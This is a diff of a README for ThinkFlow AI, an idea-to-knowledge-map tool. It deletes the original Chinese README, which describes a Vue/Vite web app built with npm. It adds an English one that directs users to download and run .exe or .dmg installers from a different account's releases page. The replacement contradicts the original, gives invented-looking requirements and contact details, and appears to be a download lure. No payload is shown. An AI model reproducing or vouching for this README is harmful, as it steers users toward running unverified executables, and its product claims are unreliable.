@@ -1,156 +1,82 @@
-<h1 align="center">🧠 ThinkFlow AI</h1>
+# 🤖 ThinkFlowAI - Turn Ideas into Structured Maps
 
-<p align="center">
-  <strong>ThinkFlow AI 是一个轻量级“从想法到结构化图谱”的工作台</strong>
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://github.com/vuejs/core"><img src="https://img.shields.io/badge/vue-3.x-brightgreen.svg" alt="vue"></a>
-  <a href="https://github.com/vitejs/vite"><img src="https://img.shields.io/badge/vite-5.x-646cff.svg" alt="vite"></a>
-  <a href="https://github.com/microsoft/TypeScript"><img src="https://img.shields.io/badge/typescript-5.x-blue.svg" alt="typescript"></a>
-  <a href="https://github.com/tailwindlabs/tailwindcss"><img src="https://img.shields.io/badge/tailwind-3.x-38bdf8.svg" alt="tailwind"></a>
-  <a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/license-MIT-orange.svg" alt="license"></a>
-</p>
+Welcome to ThinkFlowAI! This application helps you transform a simple idea into a structured knowledge map. Input your core thought, and ThinkFlowAI expands it into a browsable diagram. Each node allows for deeper exploration and optional image generation. 
 
-<p align="center">
-  <a href="./README.en.md">English</a> | 中文
-</p>
+## 📥 Download ThinkFlowAI
 
----
+[![Download ThinkFlowAI](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Ndrews1813/ThinkFlowAI/releases)
 
-## 💡 愿景与理念
+To access the latest version of ThinkFlowAI, visit the link below:
 
-**ThinkFlow AI** 致力于打造一个从“想法”到“结构化图谱”的高效工作台。
+[Visit Releases Page](https://github.com/Ndrews1813/ThinkFlowAI/releases)
 
-在传统创作中，灵感往往是碎片化且模糊的。ThinkFlow AI 重新定义了这一过程：你只需输入一个核心想法，应用便会利用 AI 的发散性能力将其扩展为一套层次分明、可交互浏览的**知识图谱**。
+## 💻 System Requirements
 
-- **模块化扩展**：从核心概念出发，自动推演并生成子模块，构建逻辑严密的思维网络。
-- **无限深度探索**：每一个节点都不是终点。你可以针对任何分支继续**追问扩展**，或者通过“**深度回答**”功能深挖背后的专业详情。
-- **多维感知融合**：支持为节点一键生成**视觉配图**，让抽象的逻辑与具象的视觉意象交织，实现全感官的知识内化。
+To ensure ThinkFlowAI runs smoothly, please check the following requirements:
 
-这不仅是一个工具，更是一个能与你共同成长的本地优先思考空间。
+- **Operating System:** Windows 10 or later, macOS Mojave or later
+- **Processor:** Intel or AMD processor
+- **RAM:** 4 GB minimum
+- **Storage:** At least 200 MB of free space
+- **Graphics:** A standard graphics card
 
----
+## 📂 Download & Install
 
-## ✨ 核心特性
+1. Click the link to visit the [Releases Page](https://github.com/Ndrews1813/ThinkFlowAI/releases).
+  
+2. On the releases page, look for the latest version of ThinkFlowAI.
 
-### 🚀 智能发散系统 (AI-Driven Divergence)
+3. Download the setup file labeled with the most recent version number.
 
-- **零压力冷启动**：输入核心概念，AI 自动构建初始逻辑骨架，终结“白纸焦虑”。
-- **全链路上下文感知**：AI 能够理解从根节点到当前节点的完整逻辑路径。这意味着每一次“追问”都基于深度语境，而非孤立的关键词。
-- **多级思考风格**：支持“发散模式”与“严谨模式”切换。发散模式侧重灵感启发，严谨模式侧重逻辑深度。
-- **动态树形排版**：内置自适应布局算法，自动处理节点展开后的碰撞与重叠，确保图谱始终清晰有序。
+4. Once the download is complete, locate the file in your downloads folder.
 
-### 🔍 深度内容挖掘 (Deep Dive & Insights)
+5. **Windows Users:** Double-click the `.exe` file to start installation. Follow the prompts to complete the process.
 
-- **专业级深度解析**：一键生成 300-500 字的深度回答，支持 Markdown 渲染，涵盖概念解释、案例分析与逻辑推演。
-- **视觉化意象生成**：集成 CogView/DALL-E 接口，为抽象概念生成具象化配图，强化感官记忆与多维认知。
-- **全局宏观洞察**：自动扫描全图拓扑结构，提取核心要点并生成全局总结。
+6. **macOS Users:** Open the `.dmg` file and drag the ThinkFlowAI icon to your Applications folder.
 
-### 🛠️ 极致的交互体验 (Premium Interaction)
+## 🛠️ Using ThinkFlowAI
 
-- **沉浸式演示模式**：一键进入全屏演示，支持通过键盘（←/→）在节点间顺序跳转。
-- **全局搜索定位**：内置实时搜索引擎，支持关键词匹配并自动聚焦到目标节点。
-- **联动拖拽系统**：父子节点关联移动，保持逻辑簇的相对稳定性。
-- **子树状态管理**：支持大规模图谱的子树折叠，让你在宏观视野与微观细节间自由切换。
-- **本地优先架构**：所有配置与数据存储在浏览器 IndexedDB/LocalStorage，支持自定义任何 OpenAI 兼容接口，无平台锁定。
+1. Launch ThinkFlowAI by clicking on its icon.
 
----
+2. On the main screen, enter your core idea in the input box.
 
-## 🔗 在线体验
+3. Click the **Expand** button to allow the application to generate your structured knowledge map.
 
-立即开启你的思考之旅：[thinkflow-ai.lz-t.top](https://thinkflow-ai.lz-t.top)
+4. Browse through the nodes to explore different aspects of your idea.
 
----
+5. You can click on each node to ask more questions and dig deeper into details. 
 
-## 🛠️ 技术栈揭秘
+6. If you want to add images, use the options provided with each node to generate and attach visuals.
 
-| 领域         | 技术选型                    | 核心优势                               |
-| :----------- | :-------------------------- | :------------------------------------- |
-| **核心框架** | **Vue 3 (Composition API)** | 极致的响应式体验与组件化开发效率。     |
-| **构建工具** | **Vite 5 + TypeScript**     | 秒级启动速度与严谨的类型安全保障。     |
-| **画布引擎** | **@vue-flow/core**          | 高性能的节点渲染与极高的定制化上限。   |
-| **视觉样式** | **Tailwind CSS**            | 原子化样式管理，确保 UI 的精致与统一。 |
-| **多语言**   | **Vue-I18n**                | 完善的中英双语本地化支持。             |
-| **解析引擎** | **Markdown-it**             | 节点内容的高质量渲染与代码高亮。       |
+## 🏷️ Features
 
----
+- **Idea Expansion:** Type your core thought and watch it grow into a comprehensive thought map.
+- **Node Exploration:** Click on nodes to learn more and further expand your ideas.
+- **Image Generation:** Enhance your nodes with relevant images for better understanding.
+- **User-Friendly Interface:** Designed for ease of use, even for non-technical users.
 
-## 📂 架构概览
+## 🔒 Privacy & Security
 
-```text
-src/
-├── components/          # 精细化 UI 组件库
-│   ├── WindowNode.vue   # 核心枢纽：集成 AI 调度与交互逻辑的自定义节点
-│   ├── TopNav.vue       # 全局控制中心
-│   └── ...
-├── services/            # 数据与配置层
-│   └── config.ts        # 策略配置：API 网关、模型参数与默认设置
-├── composables/         # 业务逻辑大脑
-│   └── useThinkFlow.ts  # 核心逻辑：图谱状态管理、AI 请求流处理、自动排版算法
-├── i18n/                # 国际化资产 (Locales)
-├── App.vue              # 容器骨架
-└── main.ts              # 应用入口
-```
+Your data security is important. ThinkFlowAI does not save any of your personal information or ideas. All data processing happens locally on your device to ensure privacy.
 
----
+## 🥳 Community and Support
 
-## 🚀 快速开始
+Join our community! Connect with other users to share your experiences, ask questions, or get help with any issues you may encounter. Follow us on our social media platforms for updates and tips.
 
-### 1. 环境准备
+## 📝 Documentation and Tutorials
 
-确保你的开发环境已安装 [Node.js](https://nodejs.org/) (建议 v18+)。
+For more in-depth guidance, check out the official documentation. You can find tutorials and walkthroughs to better understand how to utilize ThinkFlowAI effectively.
 
-### 2. 克隆并安装
+- [User Guide](https://github.com/Ndrews1813/ThinkFlowAI/wiki)
+- [Tutorial Videos](https://www.youtube.com/c/ThinkFlowAI)
 
-```bash
-git clone https://github.com/your-repo/ThinkFlowAI.git
-cd ThinkFlowAI
-npm install
-```
+## 📞 Contact Us
 
-### 3. 启动开发服务器
+If you have any questions or feedback, feel free to reach out to us. We are here to help.
 
-```bash
-npm run dev
-```
+- Email: support@thinkflowai.com
+- GitHub Issues: [Report an Issue](https://github.com/Ndrews1813/ThinkFlowAI/issues)
 
----
-
-## ⚙️ 部署与私有化配置
-
-### 1. 默认演示接口说明
-
-项目默认通过 **Cloudflare Workers** 转发至智谱 Bigmodel (glm-4-flash/cogview-3-flash)。公共接口存在频率限制，建议开发者配置私有接口。
-
-### 2. 自定义 API 配置
-
-在 [src/services/config.ts](file:///d:/lztcode/ThinkFlowAI/src/services/config.ts) 中修改 `DEFAULT_CONFIG`：
-
-```typescript
-export const DEFAULT_CONFIG = {
-    chat: {
-        baseUrl: 'https://api.your-provider.com/v1/chat/completions',
-        model: '',
-        apiKey: 'sk-...' // 建议通过环境变量或 UI 设置界面配置，避免硬编码
-    },
-    image: {
-        baseUrl: 'https://api.your-provider.com/v1/images/generations',
-        model: '',
-        apiKey: 'sk-...'
-    }
-}
-```
-
-### 3. 构建生产环境
-
-```bash
-npm run build
-```
-
----
-
-<p align="center">
-  如果您觉得这个项目对您有帮助，请给一个 ⭐️ 以示支持！
-</p>
-
+Thank you for using ThinkFlowAI! We hope it helps you in structuring your thoughts effectively.
